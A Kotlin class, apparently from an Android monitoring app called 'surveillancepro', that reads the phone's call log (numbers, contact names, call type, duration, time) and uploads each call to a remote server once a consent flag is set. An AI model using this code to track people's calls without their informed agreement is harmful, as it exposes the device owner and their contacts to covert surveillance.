package com.surveillancepro.android.services

import android.content.Context
import android.database.Cursor
import android.provider.CallLog
import com.surveillancepro.android.data.ApiClient
import com.surveillancepro.android.data.DeviceStorage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class CallLogTracker(private val context: Context) {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val prefs = context.getSharedPreferences("sp_calllog", Context.MODE_PRIVATE)

    fun syncNewCalls() {
        val storage = DeviceStorage.getInstance(context)
        if (!storage.hasAccepted || storage.deviceToken == null) return

        val lastSync = prefs.getLong("last_call_sync", 0L)
        val calls = getCallsSince(lastSync)

        if (calls.isEmpty()) return

        scope.launch {
            val api = ApiClient.getInstance(storage)
            for (call in calls) {
                try {
                    api.sendEvent("phone_call", call)
                } catch (_: Exception) {}
            }
            prefs.edit().putLong("last_call_sync", System.currentTimeMillis()).apply()
        }
    }

    private fun getCallsSince(since: Long): List<Map<String, Any>> {
        val calls = mutableListOf<Map<String, Any>>()
        val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)

        var cursor: Cursor? = null
        try {
            val selection = if (since > 0) "${CallLog.Calls.DATE} > ?" else null
            val selectionArgs = if (since > 0) arrayOf(since.toString()) else null

            cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.DATE,
                ),
                selection,
                selectionArgs,
                "${CallLog.Calls.DATE} DESC"
            )

            cursor?.let {
                val maxCalls = 50
                var count = 0
                while (it.moveToNext() && count < maxCalls) {
                    val number = it.getString(0) ?: "inconnu"
                    val name = it.getString(1) ?: ""
                    val type = it.getInt(2)
                    val duration = it.getLong(3)
                    val date = it.getLong(4)

                    val callType = when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "entrant"
                        CallLog.Calls.OUTGOING_TYPE -> "sortant"
                        CallLog.Calls.MISSED_TYPE -> "manque"
                        CallLog.Calls.REJECTED_TYPE -> "rejete"
                        else -> "autre"
                    }

                    calls.add(mapOf(
                        "number" to number,
                        "contact" to name,
                        "type" to callType,
                        "durationSeconds" to duration,
                        "durationMinutes" to (duration / 60),
                        "timestamp" to dateFormat.format(Date(date)),
                    ))
                    count++
                }
            }
        } catch (_: SecurityException) {
        } finally {
            cursor?.close()
        }

        return calls
    }
}
